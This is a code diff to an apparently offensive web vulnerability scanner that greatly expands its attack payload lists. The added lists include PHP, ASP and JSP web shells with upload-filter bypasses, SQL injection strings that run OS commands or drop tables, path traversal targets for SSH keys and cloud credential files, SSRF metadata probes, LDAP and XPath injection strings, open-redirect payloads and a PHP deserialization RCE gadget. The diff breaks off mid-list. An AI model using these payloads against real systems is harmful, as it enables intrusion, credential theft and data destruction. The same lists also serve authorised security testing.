@@ -36,6 +36,8 @@ Checks:
 """
 
 import asyncio
+import json as _json_mod
+import random as _random
 import re
 import socket
 import threading
@@ -55,7 +57,7 @@ import aiohttp
 from core import scan_proxy
 from core.session_store import save_session as _store_save, load_sessions as _store_load, delete_session as _store_delete
 from core.accuracy import score_finding, is_likely_false_positive
-from core.think_engine import _TECH_PAYLOAD_MAP
+from core.think_engine import _TECH_PAYLOAD_MAP, build_think_engine, TimingAnalyzer
 
 logger = __import__("logging").getLogger("ds1hunter.active_scanner")
 
@@ -201,23 +203,126 @@ _SQLI_ERRORS = re.compile(
     r"SQL syntax|mysql_fetch|ORA-\d{5}|PostgreSQL.*ERROR|"
     r"sqlite3\.OperationalError|SQLSTATE|Unclosed quotation mark|"
     r"Warning.*mysql_|You have an error in your SQL syntax|"
-    r"supplied argument is not a valid MySQL|ODBC SQL Server Driver",
+    r"supplied argument is not a valid MySQL|ODBC SQL Server Driver|"
+    # MSSQL / OLE DB
+    r"Microsoft OLE DB Provider for SQL Server|"
+    r"Incorrect syntax near|Unclosed quotation mark after|"
+    r"Conversion failed when converting|"
+    r"Cannot open database|Login failed for user|"
+    # PostgreSQL
+    r"pg_exec\(\)|pg_query\(\)|unterminated quoted string at|"
+    r"ERROR:\s+syntax error at or near|"
+    r"column .* does not exist|"
+    # MySQL / MariaDB
+    r"mysql_num_rows\(\)|mysql_result\(\)|Division by zero|"
+    r"You have an error in your SQL|Lost connection to MySQL|"
+    r"Table '.*' doesn't exist|Unknown column '.*' in|"
+    # Oracle
+    r"quoted string not properly terminated|"
+    r"ORA-01756:|ORA-00907:|ORA-00933:|ORA-01747:|"
+    # DB2
+    r"DB2 SQL Error|SQLCODE|SQLERRMC|db2_fetch|"
+    r"com\.ibm\.db2\.jcc|"
+    # Firebird / Interbase
+    r"dynamic SQL error|SQL error code = |"
+    r"ibase_query\(\)|"
+    # SAP HANA
+    r"SAP DBTech JDBC|"
+    # Generic JDBC / Hibernate
+    r"JDBCExceptionReporter|HibernateException|"
+    r"org\.hibernate\.exception|"
+    r"java\.sql\.SQLException|"
+    r"com\.mysql\.jdbc\.exceptions|"
+    r"net\.sf\.hibernate|"
+    # Generic
+    r"QueryException|NpgsqlException|"
+    r"DriverManager\.getConnection|Statement\.executeQuery|"
+    r"PDOException|ADODB\.Recordset",
     re.I,
 )
 
 _SENSITIVE_FILES = [
-    '.env', '.env.local', '.env.production',
-    '.git/config', '.git/HEAD',
-    'config.php', 'config.yml', 'config.yaml',
-    'wp-config.php', 'web.config',
-    'database.yml', 'secrets.yml',
-    'backup.sql', 'dump.sql', 'db.sql',
-    'phpinfo.php',
-    'server-status', 'server-info',
-    'actuator/env', 'actuator/health', 'actuator/info',
-    '.DS_Store',
-    'robots.txt', 'sitemap.xml',
+    # ── Environment / secrets ─────────────────────────────────────────────────
+    '.env', '.env.local', '.env.production', '.env.staging', '.env.dev',
+    '.env.backup', '.env.bak', '.env.old', '.env.example', '.env.sample',
+    '.env.test', '.env.development', '.env~',
+    # ── Git / source control ──────────────────────────────────────────────────
+    '.git/config', '.git/HEAD', '.git/FETCH_HEAD', '.git/index',
+    '.git/logs/HEAD', '.git/refs/heads/main', '.git/refs/heads/master',
+    '.git/packed-refs', '.gitignore', '.gitconfig',
+    '.svn/entries', '.svn/wc.db', '.hg/hgrc',
+    # ── Config files ──────────────────────────────────────────────────────────
+    'config.php', 'config.yml', 'config.yaml', 'config.json', 'config.xml',
+    'config.js', 'config.ts', 'config.ini', 'config.cfg', 'config.conf',
+    'configuration.php', 'configuration.yml', 'settings.py', 'settings.php',
+    'local_settings.py', 'local.py', 'production.py',
+    'app.config', 'app.settings', 'appsettings.json', 'appsettings.Development.json',
+    'application.properties', 'application.yml', 'application.yaml',
+    'bootstrap.php', 'parameters.yml', 'parameters.yaml',
+    # ── WordPress / CMS ───────────────────────────────────────────────────────
+    'wp-config.php', 'wp-config.php.bak', 'wp-config.php~',
+    'wp-login.php', 'wp-cron.php', 'xmlrpc.php',
+    'wp-content/debug.log', 'wp-admin/admin-ajax.php',
+    'wp-includes/version.php',
+    # ── ASP.NET / IIS ─────────────────────────────────────────────────────────
+    'web.config', 'Web.config', 'web.config.bak', 'web.Debug.config',
+    'global.asax', 'elmah.axd', 'trace.axd', 'ScriptResource.axd',
+    # ── Database dumps / backups ──────────────────────────────────────────────
+    'backup.sql', 'dump.sql', 'db.sql', 'database.sql',
+    'backup.tar.gz', 'backup.zip', 'backup.tar',
+    'db_backup.sql', 'mysql.sql', 'data.sql',
+    'dump.tar.gz', 'site.tar.gz', 'www.tar.gz', 'html.tar.gz',
+    'backup.gz', 'db.gz', 'sql.gz',
+    # ── PHP diagnostics ───────────────────────────────────────────────────────
+    'phpinfo.php', 'info.php', 'php_info.php', 'test.php', 'i.php',
+    'setup.php', 'install.php', 'admin.php', 'administrator.php',
+    # ── Apache / Nginx ────────────────────────────────────────────────────────
+    'server-status', 'server-info', '.htaccess', '.htpasswd',
+    'nginx.conf', 'apache.conf', '.nginx',
+    # ── Spring Boot / Java actuators ──────────────────────────────────────────
+    'actuator', 'actuator/env', 'actuator/health', 'actuator/info',
+    'actuator/mappings', 'actuator/beans', 'actuator/metrics',
+    'actuator/dump', 'actuator/heapdump', 'actuator/threaddump',
+    'actuator/logfile', 'actuator/httptrace', 'actuator/auditevents',
+    'actuator/conditions', 'actuator/configprops', 'actuator/caches',
+    'actuator/scheduledtasks', 'actuator/sessions', 'actuator/shutdown',
+    'manage/health', 'manage/env', 'manage/metrics',
+    # ── Laravel / PHP frameworks ──────────────────────────────────────────────
+    'storage/logs/laravel.log', 'storage/framework/sessions',
+    '.env.laravel', 'artisan', 'composer.json', 'composer.lock',
+    'package.json', 'package-lock.json', 'yarn.lock',
+    # ── Rails / Ruby ─────────────────────────────────────────────────────────
+    'database.yml', 'secrets.yml', 'credentials.yml.enc',
+    'config/database.yml', 'config/secrets.yml', 'config/credentials.yml',
+    'log/production.log', 'log/development.log',
+    'Gemfile', 'Gemfile.lock',
+    # ── Node.js ───────────────────────────────────────────────────────────────
+    '.npmrc', '.yarnrc', 'npm-debug.log', '.node_history',
+    # ── Python / Django / Flask ───────────────────────────────────────────────
+    'requirements.txt', 'Pipfile', 'Pipfile.lock', 'pyproject.toml',
+    'manage.py', 'wsgi.py', 'asgi.py', 'celery.py',
+    # ── Docker / Kubernetes ───────────────────────────────────────────────────
+    'Dockerfile', 'docker-compose.yml', 'docker-compose.yaml',
+    '.docker/config.json', 'docker-compose.override.yml',
+    'k8s.yml', 'k8s.yaml', 'kubernetes.yml', 'helm/values.yaml',
+    # ── Cloud / AWS / Azure / GCP ────────────────────────────────────────────
+    '.aws/credentials', '.aws/config', '.boto', '.s3cfg',
+    'credentials', 'credentials.json', 'service-account.json',
+    # ── CI/CD ─────────────────────────────────────────────────────────────────
+    '.travis.yml', '.circleci/config.yml', '.github/workflows/deploy.yml',
+    'Jenkinsfile', '.gitlab-ci.yml', 'bitbucket-pipelines.yml',
+    # ── SSH / TLS ─────────────────────────────────────────────────────────────
+    'id_rsa', 'id_dsa', 'id_ecdsa', 'id_ed25519',
+    '.ssh/authorized_keys', '.ssh/known_hosts', '.ssh/config',
+    'server.key', 'server.pem', 'private.key', 'private.pem',
+    '*.p12', 'keystore.jks', 'truststore.jks',
+    # ── Discovery metadata ────────────────────────────────────────────────────
+    'robots.txt', 'sitemap.xml', 'sitemap_index.xml',
     'crossdomain.xml', 'clientaccesspolicy.xml',
+    '.well-known/security.txt', '.well-known/openid-configuration',
+    # ── macOS / editor ────────────────────────────────────────────────────────
+    '.DS_Store', 'Thumbs.db', '.idea/workspace.xml',
+    '.vscode/settings.json', '*.swp', '*.swo',
 ]
 
 _SEC_HEADERS = [
@@ -274,6 +379,41 @@ _REDIRECT_PAYLOADS = [
     '///evil.com/%2F%2F',
     'https://%65vil.com',              # punycode-ish e → %65
     '//evil%2Ecom',
+    # Open redirect via path confusion
+    '/evil.com',
+    '//evil.com/',
+    '///evil.com/',
+    '////evil.com/',
+    '/\\/evil.com',
+    '/%2F%2Fevil.com',
+    # Unicode homoglyph
+    'https://ⓔvil.com',
+    'https://evil.com%E3%80%82',       # ideographic full stop
+    # Scheme-less with port
+    '//evil.com:80',
+    '//evil.com:443',
+    '//evil.com:8080',
+    # Fragment confusion
+    'https://evil.com/#@trusted.com',
+    '//evil.com#.trusted.com',
+    # Encoded slash variants
+    'https://evil%2ecom',
+    'https://evil%252ecom',
+    '//evil%00.trusted.com',
+    # Double URL encoding
+    '%252F%252Fevil.com',
+    '%25%32%66%25%32%66evil.com',
+    # Bypass via redirect chain
+    'https://www.google.com/url?q=https://evil.com',
+    'https://accounts.google.com/signout?continue=https://evil.com',
+    # vbscript / data schemes
+    'vbscript:msgbox(1)',
+    'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
+    # Open redirect via Referer header (path)
+    '///\\/evil.com',
+    '\\evil.com',
+    '\t//evil.com',
+    '\r//evil.com',
 ]
 
 # HTTP verbs to try for verb tampering
@@ -370,63 +510,73 @@ _AUTH_BYPASS_HEADERS = [
     {'X-Forwarded-Host': 'localhost'},
 ]
 
+# Session-unique SSTI canary — eliminates false positives from natural page content.
+# A 5-digit canary squared gives a 9-10 digit result that will never appear on a
+# real web page organically (e.g. prices, counts, ratings only go up to ~4 digits).
+_SSTI_C  = _random.randint(10007, 99991)          # e.g. 73421
+_SSTI_SQ = str(_SSTI_C * _SSTI_C)                 # e.g. '5390641241' — practically unique
+
+def _sc(template: str) -> str:
+    """Substitute C placeholder with the session canary integer."""
+    return template.replace('C', str(_SSTI_C))
+
 _SSTI_PAYLOADS = {
     # ── Jinja2 / Twig ─────────────────────────────────────────────────────────
-    '{{7*7}}':                                        '49',
-    "{{7*'7'}}":                                      '7777777',
+    _sc('{{C*C}}'):                                   _SSTI_SQ,
+    "{{7*'7'}}":                                      '7777777',   # string multiply — already unique
     '{{config}}':                                     'SECRET',
     '{{self.__dict__}}':                              '__dict__',
     '{{"".class.mro}}':                               'object',
     # ── Freemarker ────────────────────────────────────────────────────────────
-    '${7*7}':                                         '49',
+    _sc('${C*C}'):                                    _SSTI_SQ,
     '${"freemarker".toUpperCase()}':                  'FREEMARKER',
-    '<#assign x=7*7>${x}':                            '49',
+    _sc('<#assign x=C*C>${x}'):                       _SSTI_SQ,
     '<#list 0..6 as i>${i}</#list>':                  '0123456',
     # ── Thymeleaf ─────────────────────────────────────────────────────────────
-    '[[${7*7}]]':                                     '49',
-    '__${7*7}__':                                     '49',
+    _sc('[[${C*C}]]'):                                _SSTI_SQ,
+    _sc('__${C*C}__'):                                _SSTI_SQ,
     '[[${"th:text"}]]':                               'th:text',
     # ── Spring SpEL ───────────────────────────────────────────────────────────
-    '*{7*7}':                                         '49',
+    _sc('*{C*C}'):                                    _SSTI_SQ,
     '${T(java.lang.Runtime).getRuntime()}':           'Runtime',
     '${T(java.lang.Math).PI}':                        '3.14',
     # ── Velocity ──────────────────────────────────────────────────────────────
-    '#set($x=7*7)$x':                                 '49',
+    _sc('#set($x=C*C)$x'):                            _SSTI_SQ,
     '#set($s="ds1")$s':                               'ds1',
-    '${7*7}##':                                       '49',
+    _sc('${C*C}##'):                                  _SSTI_SQ,
     # ── Ruby ERB / Slim ───────────────────────────────────────────────────────
-    '<%= 7*7 %>':                                     '49',
+    _sc('<%= C*C %>'):                                _SSTI_SQ,
     '<%= "ds1hunter" %>':                             'ds1hunter',
     # ── Smarty ────────────────────────────────────────────────────────────────
-    '{7*7}':                                          '49',
-    '{math equation="7*7"}':                          '49',
-    '{assign var="x" value=49}{$x}':                  '49',
+    _sc('{C*C}'):                                     _SSTI_SQ,
+    _sc('{math equation="C*C"}'):                     _SSTI_SQ,
+    _sc('{assign var="x" value=C*C}{$x}'):            _SSTI_SQ,
     # ── Pug / Jade ────────────────────────────────────────────────────────────
-    '#{7*7}':                                         '49',
-    'p= 7*7':                                         '49',
+    _sc('#{C*C}'):                                    _SSTI_SQ,
+    _sc('p= C*C'):                                    _SSTI_SQ,
     # ── Handlebars ────────────────────────────────────────────────────────────
     '{{#with "s" as |string|}}':                      'string',
     '{{lookup . "constructor"}}':                     'function',
     # ── Nunjucks / Liquid ─────────────────────────────────────────────────────
-    '{{ 7 * 7 }}':                                    '49',
-    '{% set x = 7*7 %}{{ x }}':                      '49',
+    _sc('{{ C * C }}'):                               _SSTI_SQ,
+    _sc('{{% set x = C*C %}}{{ x }}'):                _SSTI_SQ,
     # ── Mako ──────────────────────────────────────────────────────────────────
-    '${7*7}':                                         '49',
-    '<%=7*7%>':                                       '49',
+    _sc('<%=C*C%>'):                                  _SSTI_SQ,
+    _sc('<%-C*C%>'):                                  _SSTI_SQ,
     # ── Go html/template ─────────────────────────────────────────────────────
     '{{.}}':                                          'map',
     # ── Razor / .NET ──────────────────────────────────────────────────────────
-    '@(7+7)':                                         '14',
-    '@{var x=7; @(x*7)}':                            '49',
+    _sc('@(C*C)'):                                    _SSTI_SQ,
+    _sc('@{var x=C; @(x*C)}'):                        _SSTI_SQ,
     # ── EJS ───────────────────────────────────────────────────────────────────
-    '<%-7*7%>':                                       '49',
-    '<%=7*7%>':                                       '49',
+    _sc('<%-C*C%>'):                                  _SSTI_SQ,
+    _sc('<%=C*C%>'):                                  _SSTI_SQ,
     # ── Dot.js ────────────────────────────────────────────────────────────────
-    '{{=7*7}}':                                       '49',
+    _sc('{{=C*C}}'):                                  _SSTI_SQ,
     # ── CSTI: AngularJS (client-side) ────────────────────────────────────────
     '{{constructor.constructor("alert(1)")()}}':      'csti',
     '{{$on.constructor("alert(1)")()}}':              'csti',
-    '{{7*7|limitTo:1}}':                              '7',
+    _sc('{{C*C|limitTo:1}}'):                         str(_SSTI_C)[0],
     # ── CSTI: Vue.js ─────────────────────────────────────────────────────────
     '{{_c}}':                                         'function',
     '{{$mount}}':                                     'function',
@@ -517,6 +667,54 @@ _TRAVERSAL_PAYLOADS = [
     # ── ZIP slip targets (for archive-based traversal) ────────────────────────
     '../../../tmp/evil.sh',
     '../../../../../../var/www/html/shell.php',
+    # ── Additional Linux paths ────────────────────────────────────────────────
+    '/etc/crontab',
+    '/etc/cron.d/',
+    '/etc/sudoers',
+    '/root/.bash_history',
+    '/root/.ssh/id_rsa',
+    '/home/ubuntu/.ssh/id_rsa',
+    '/var/lib/jenkins/.ssh/id_rsa',
+    '/etc/mysql/my.cnf',
+    '/etc/postgresql/*/main/pg_hba.conf',
+    '/var/lib/postgresql/data/pg_hba.conf',
+    '/etc/redis/redis.conf',
+    '/etc/nginx/nginx.conf',
+    '/etc/nginx/sites-enabled/default',
+    '/etc/apache2/apache2.conf',
+    '/etc/apache2/sites-enabled/000-default.conf',
+    '/usr/local/etc/nginx/nginx.conf',
+    # ── Application config paths ──────────────────────────────────────────────
+    '/var/www/html/.env',
+    '/var/www/html/config.php',
+    '/var/www/html/wp-config.php',
+    '/var/www/html/configuration.php',
+    '/app/.env',
+    '/app/config/database.yml',
+    '/app/config/secrets.yml',
+    '/srv/www/htdocs/settings.php',
+    # ── Truncation attacks (PHP) ──────────────────────────────────────────────
+    '../../../etc/passwd.....',
+    '../../../etc/passwd........................................................................................................................................................................................................................................................................................................................................................................................................................................................................................',
+    # ── Path normalization bypass ─────────────────────────────────────────────
+    '.%00./.%00./etc/passwd',
+    '..%01/..%01/etc/passwd',
+    '..%u2215..%u2215etc/passwd',
+    '..%uEFC8..%uEFC8etc/passwd',
+    # ── Restricted path prefix bypass ────────────────────────────────────────
+    '/var/www/../../etc/passwd',
+    '/images/../../../etc/passwd',
+    '/static/../../../../etc/passwd',
+    # ── Windows registry / config ─────────────────────────────────────────────
+    'C:\\Windows\\System32\\config\\SYSTEM',
+    'C:\\inetpub\\wwwroot\\web.config',
+    '%WINDIR%\\win.ini',
+    '%SYSTEMROOT%\\System32\\drivers\\etc\\hosts',
+    # ── Cloud credential paths ────────────────────────────────────────────────
+    '/home/ec2-user/.aws/credentials',
+    '/root/.aws/credentials',
+    '/home/ubuntu/.aws/credentials',
+    '/var/task/.aws/credentials',
 ]
 
 _TRAVERSAL_SIG = re.compile(r'root:[x*]:0:0', re.I)
@@ -612,7 +810,7 @@ _SQLI_PAYLOADS = [
     "%27%20OR%201%3D1--",
     "\x27 OR 1=1--",
     # ── JSON SQLi ────────────────────────────────────────────────────────────
-    '{"user":"admin\\'--","pass":"x"}',
+    '{"user":"admin\'--","pass":"x"}',
     '{"id":"1 OR 1=1--"}',
     # ── Time-based init ───────────────────────────────────────────────────────
     "' AND SLEEP(1)--",
@@ -622,6 +820,38 @@ _SQLI_PAYLOADS = [
     # ── Second-order canary ──────────────────────────────────────────────────
     "ds1sqli'--",
     "ds1sqli\"--",
+    # ── Oracle advanced ──────────────────────────────────────────────────────
+    "' AND 1=UTL_INADDR.GET_HOST_ADDRESS('ds1hunter.invalid')--",
+    "' AND (SELECT banner FROM v$version WHERE banner LIKE 'Oracle%' AND ROWNUM=1)='x'--",
+    "' OR 1=1 UNION SELECT NULL FROM DUAL--",
+    # ── DB2 ──────────────────────────────────────────────────────────────────
+    "' AND 1=(SELECT COUNT(*) FROM sysibm.systables)--",
+    "' UNION SELECT NULL FROM sysibm.sysdummy1--",
+    # ── Out-of-Band / DNS triggers ────────────────────────────────────────────
+    "'; EXEC master..xp_dirtree '//ds1hunter.invalid/a'--",
+    "' AND LOAD_FILE(CONCAT(0x5c5c5c5c,(SELECT version()),0x2e2eds1hunter2einvalid0x5c61))--",
+    # ── Numeric param injection ───────────────────────────────────────────────
+    "1 OR 1=1",
+    "1; DROP TABLE users--",
+    "1 UNION SELECT @@version--",
+    "0 UNION SELECT user(),2,3--",
+    # ── MSSQL advanced ───────────────────────────────────────────────────────
+    "'; EXEC xp_cmdshell('whoami')--",
+    "' AND 1=CONVERT(int,db_name())--",
+    "' AND 1=CONVERT(int,user_name())--",
+    # ── PostgreSQL advanced ────────────────────────────────────────────────────
+    "' AND 1=CAST(current_database() AS INT)--",
+    "'; COPY (SELECT '') TO PROGRAM 'id'--",
+    # ── MySQL advanced ────────────────────────────────────────────────────────
+    "' AND (SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata) IS NOT NULL--",
+    "' AND (SELECT SUBSTRING(user(),1,1))='r'--",
+    "' AND EXISTS(SELECT 1 FROM information_schema.tables)--",
+    # ── Hex encoding bypass ───────────────────────────────────────────────────
+    "0x27204f52203078313d3078312d2d",
+    # ── Inline comment variations ─────────────────────────────────────────────
+    "'/*!OR*/1=1--",
+    "'/**/OR/**/1=1--",
+    "' OR/**/'1'/**/ = /**/'1'--",
 ]
 
 # ── Blind SQLi ────────────────────────────────────────────────────────────────
@@ -827,6 +1057,271 @@ _XSS_CTX_PAYLOADS = {
     ],
 }
 
+# ── File Upload ───────────────────────────────────────────────────────────────
+
+# PHP/ASP/JSP webshell content variants
+_UPLOAD_SHELL_PHP   = b'<?php echo shell_exec($_GET["cmd"]); ?>'
+_UPLOAD_SHELL_ASP   = b'<% Response.Write(CreateObject("WScript.Shell").Exec(Request("cmd")).StdOut.ReadAll()) %>'
+_UPLOAD_SHELL_JSP   = b'<% Runtime rt=Runtime.getRuntime(); String[] c={"/bin/sh","-c",request.getParameter("cmd")}; Process p=rt.exec(c); out.println(new java.util.Scanner(p.getInputStream()).useDelimiter("\\\\A").next()); %>'
+
+# GIF89a magic bytes prepended to disguise as image (polyglot)
+_GIF_MAGIC = b'GIF89a\n'
+
+# Dangerous extensions to try uploading
+_UPLOAD_EXTENSIONS = [
+    # PHP variants
+    ('.php',   'application/x-php',          _UPLOAD_SHELL_PHP),
+    ('.php5',  'application/x-php',          _UPLOAD_SHELL_PHP),
+    ('.php7',  'application/x-php',          _UPLOAD_SHELL_PHP),
+    ('.phtml', 'application/x-php',          _UPLOAD_SHELL_PHP),
+    ('.phar',  'application/x-php',          _UPLOAD_SHELL_PHP),
+    ('.php3',  'application/x-php',          _UPLOAD_SHELL_PHP),
+    ('.php4',  'application/x-php',          _UPLOAD_SHELL_PHP),
+    ('.pHp',   'application/x-php',          _UPLOAD_SHELL_PHP),   # case bypass
+    ('.PHP',   'application/x-php',          _UPLOAD_SHELL_PHP),   # case bypass
+    # Content-type bypass (dangerous ext + allowed MIME)
+    ('.php',   'image/jpeg',                 _GIF_MAGIC + _UPLOAD_SHELL_PHP),
+    ('.php',   'image/png',                  _GIF_MAGIC + _UPLOAD_SHELL_PHP),
+    ('.php',   'image/gif',                  _GIF_MAGIC + _UPLOAD_SHELL_PHP),
+    # Double extension
+    ('.php.jpg',  'image/jpeg',              _GIF_MAGIC + _UPLOAD_SHELL_PHP),
+    ('.jpg.php',  'image/jpeg',              _UPLOAD_SHELL_PHP),
+    ('.php.png',  'image/png',              _GIF_MAGIC + _UPLOAD_SHELL_PHP),
+    ('.php.gif',  'image/gif',              _GIF_MAGIC + _UPLOAD_SHELL_PHP),
+    # Null byte bypass (server strips after \x00)
+    ('.php\x00.jpg', 'image/jpeg',           _GIF_MAGIC + _UPLOAD_SHELL_PHP),
+    ('.php%00.jpg',  'image/jpeg',           _GIF_MAGIC + _UPLOAD_SHELL_PHP),
+    # Apache .htaccess to enable PHP in uploads dir
+    ('.htaccess', 'text/plain',              b'AddType application/x-httpd-php .jpg\n'),
+    # ASP / ASPX
+    ('.asp',   'application/octet-stream',   _UPLOAD_SHELL_ASP),
+    ('.aspx',  'application/octet-stream',   _UPLOAD_SHELL_ASP),
+    ('.asa',   'application/octet-stream',   _UPLOAD_SHELL_ASP),
+    # JSP
+    ('.jsp',   'application/octet-stream',   _UPLOAD_SHELL_JSP),
+    ('.jspx',  'application/octet-stream',   _UPLOAD_SHELL_JSP),
+    # CFM / CGI
+    ('.cfm',   'application/octet-stream',   b'<cfexecute name="/bin/sh" arguments="-c id" variable="out"/><cfoutput>#out#</cfoutput>'),
+    ('.cgi',   'application/octet-stream',   b'#!/bin/bash\necho Content-type: text/plain\necho\nid\n'),
+    # SVG XSS via upload
+    ('.svg',   'image/svg+xml',              b'<svg xmlns="http://www.w3.org/2000/svg"><script>alert("ds1fileupload")</script></svg>'),
+]
+
+# Common file field names
+_UPLOAD_FIELD_NAMES = [
+    'file', 'upload', 'image', 'photo', 'avatar', 'attachment',
+    'document', 'resume', 'cv', 'logo', 'icon', 'media',
+    'thumbnail', 'picture', 'video', 'audio', 'import', 'data',
+    'userfile', 'filedata', 'uploadfile', 'files[]', 'file[]',
+]
+
+# Patterns in upload success responses that indicate the file path is disclosed
+_UPLOAD_PATH_RE = re.compile(
+    r'(?:href|src|url|path|location|file|upload(?:ed)?|saved?)\s*[=:\"\']+\s*'
+    r'([/\w\-\.]+\.(?:php\d?|phtml|phar|asp[x]?|jsp[x]?|cfm|cgi|svg|htaccess))',
+    re.I,
+)
+# Simpler path extractor for any URL-like path in response
+_UPLOAD_URL_RE = re.compile(
+    r'["\']([/\w\-\.%]+\.(?:php\d?|phtml|phar|asp[x]?|jsp[x]?|cfm|cgi|svg))["\']',
+    re.I,
+)
+# Execution confirmation: shell output signatures
+_SHELL_EXEC_RE = re.compile(
+    r'uid=\d+\(|root:[x*]:0:0|shell_exec|system\(|GIF89a.*<\?php',
+    re.I,
+)
+
+# ── XPath injection ────────────────────────────────────────────────────────────
+
+_XPATH_PAYLOADS = [
+    # Boolean bypass (single quote)
+    "' or '1'='1",
+    "' or '1'='1' or ''='",
+    "' or 1=1 or ''='",
+    "'] or '1'='1",
+    "'] or '1'='1' or ['1'='1",
+    # Boolean bypass (double quote)
+    '" or "1"="1',
+    '"] or "1"="1',
+    # Auth bypass patterns
+    "' or true() or ''='",
+    "') or ('1'='1",
+    "' or position()=1 or ''='",
+    "admin' or '1'='1",
+    "' or name()='x' or ''='",
+    # Blind XPath: string-length extraction
+    "' and string-length(name(/*[1]))>0 and ''='",
+    "' and string-length(//user[1]/password)>0 and ''='",
+    "' and substring(//user[1]/username,1,1)='a' and ''='",
+    # Error-triggering XPath
+    "x' or 1=1 or 'x'='y",
+    "' and count(/*)>0 and ''='",
+    "' and count(//user)>0 and ''='",
+    # Injection via function
+    "' or contains(//password,'admin') or ''='",
+    "' or starts-with(//user/username,'adm') or ''='",
+]
+_XPATH_ERROR_RE = re.compile(
+    r'XPath|xpath|XPathException|javax\.xml\.xpath|'
+    r'SimpleXML|XMLReader|DOMXPath|'
+    r'Invalid predicate|Unexpected end of expression|'
+    r'org\.apache\.xpath|net\.sf\.saxon|'
+    r'System\.Xml\.XPath|XPathNavigator',
+    re.I,
+)
+
+# ── LDAP injection ─────────────────────────────────────────────────────────────
+
+_LDAP_PAYLOADS = [
+    # Filter bypass
+    '*',
+    '*)',
+    '*)(',
+    '*)(uid=*',
+    '*)(|(uid=*',
+    '*)(|(password=*',
+    '*))(|(objectClass=*',
+    # Auth bypass
+    "admin)(&(password=*))",
+    "admin)(&)",
+    "*))%00",
+    "*()|%26'",
+    "*()|&'",
+    "admin*",
+    ")(cn=*",
+    # Boolean blind
+    "admin)(|(cn=*",
+    "*)(objectClass=person)(cn=a*",
+    "*(cn=admin*",
+    # Parenthesis injection
+    "(|(objectClass=*)",
+    ")(|(objectClass=*)(",
+    "admin)(!(&(1=0)",
+    # Attribute enumeration
+    "*))(|(objectCategory=*",
+    "*))(sAMAccountName=admin*",
+    "*))(mail=*@*",
+]
+_LDAP_ERROR_RE = re.compile(
+    r'LDAPException|LDAP Error|ldap_bind|ldap_search|'
+    r'Invalid DN Syntax|No Such Object|'
+    r'javax\.naming\.directory|'
+    r'org\.springframework\.ldap|com\.unboundid\.ldap|'
+    r'Net::LDAP|python-ldap',
+    re.I,
+)
+
+# ── HTTP Parameter Pollution ───────────────────────────────────────────────────
+
+_HPP_XSS_CANARY = 'ds1hpp'
+
+# ── SSRF via request headers ──────────────────────────────────────────────────
+
+_SSRF_HEADERS_PROBES = [
+    # AWS IMDS via common forwarding headers
+    ('X-Forwarded-For',    '169.254.169.254'),
+    ('X-Real-IP',          '169.254.169.254'),
+    ('X-Forwarded-Host',   '169.254.169.254'),
+    ('X-Forwarded-Server', '169.254.169.254'),
+    ('X-Remote-Addr',      '169.254.169.254'),
+    ('True-Client-IP',     '169.254.169.254'),
+    ('Client-IP',          '169.254.169.254'),
+    ('Forwarded',          'for=169.254.169.254'),
+    # Internal services
+    ('X-Forwarded-For',    '127.0.0.1'),
+    ('X-Originating-IP',   '127.0.0.1'),
+    # Azure / GCP metadata
+    ('X-Forwarded-For',    '169.254.169.254'),
+    ('X-Custom-IP-Authorization', '169.254.169.254'),
+]
+
+# ── SQLi in HTTP headers ───────────────────────────────────────────────────────
+
+_HEADER_SQLI_PAYLOADS = [
+    "' OR '1'='1",
+    "' OR 1=1--",
+    "' AND SLEEP(5)--",
+    "' AND pg_sleep(5)--",
+    "'; WAITFOR DELAY '0:0:5'--",
+    "1' AND '1'='1",
+    "\" OR \"1\"=\"1",
+    "' UNION SELECT NULL--",
+    "admin'--",
+    "' AND 1=1--",
+    "' OR 'x'='x",
+    "'; SELECT SLEEP(5)--",
+    "1; EXEC xp_cmdshell('ping 127.0.0.1')--",
+]
+
+_SQLI_INJECT_HEADERS = [
+    'User-Agent',
+    'Referer',
+    'X-Forwarded-For',
+    'X-Real-IP',
+    'X-Custom-IP-Authorization',
+    'X-Api-Key',
+    'Cookie',
+    'Accept-Language',
+    'X-Originating-IP',
+]
+
+# ── XSS in HTTP headers ────────────────────────────────────────────────────────
+
+_HEADER_XSS_PAYLOADS = [
+    '<script>alert("ds1hdr")</script>',
+    '<img src=x onerror=alert("ds1hdr")>',
+    '"><script>alert("ds1hdr")</script>',
+    "';alert('ds1hdr');//",
+    '<svg onload=alert("ds1hdr")>',
+    'javascript:alert("ds1hdr")',
+    '<body onload=alert("ds1hdr")>',
+]
+_XSS_INJECT_HEADERS = ['User-Agent', 'Referer', 'X-Forwarded-For', 'Accept-Language']
+
+# ── PHP object injection ───────────────────────────────────────────────────────
+
+_PHP_DESER_PAYLOADS = [
+    # Trigger __wakeup / __destruct
+    'O:8:"stdClass":0:{}',
+    'O:4:"User":1:{s:4:"name";s:5:"admin";}',
+    'a:2:{i:0;s:4:"test";i:1;s:4:"test";}',
+    # Magic method abuse - Monolog RCE gadget (Laravel/Symfony)
+    'O:40:"Monolog\\Handler\\SyslogUdpHandler":1:{s:9:"\\x00*\\x00socket";O:29:"Monolog\\Handler\\BufferHandler":7:{s:10:"\\x00*\\x00handler";O:29:"Monolog\\Handler\\BufferHandler":7:{s:10:"\\x00*\\x00handler";O:17:"Monolog\\Handler\\":0:{}s:13:"\\x00*\\x00bufferSize";i:-1;s:9:"\\x00*\\x00buffer";a:1:{i:0;a:2:{i:0;s:2:"id";s:5:"level";N;}}s:8:"\\x00*\\x00level";N;s:14:"\\x00*\\x00initialized";b:1;s:14:"\\x00*\\x00bufferLimit";i:-1;s:13:"\\x00*\\x00processors";a:0:{}}s:13:"\\x00*\\x00bufferSize";i:-1;s:9:"\\x00*\\x00buffer";a:0:{}s:8:"\\x00*\\x00level";N;s:14:"\\x00*\\x00initialized";b:1;s:14:"\\x00*\\x00bufferLimit";i:-1;s:13:"\\x00*\\x00processors";a:0:{}}}',
+    # WordPress unserialize gadget
+    'a:1:{s:13:"allowed_files";a:1:{s:9:"evil.php?";s:1:"1";}}',
+    # Joomla/PHP arbitrary object
